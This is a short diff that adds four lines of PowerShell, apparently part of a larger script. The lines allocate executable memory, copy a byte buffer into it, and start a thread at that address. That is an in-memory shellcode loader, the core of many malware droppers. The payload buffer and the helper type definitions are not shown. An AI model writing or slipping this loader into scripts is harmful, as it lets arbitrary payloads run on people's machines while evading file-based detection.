@@ -1,0 +1,4 @@
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
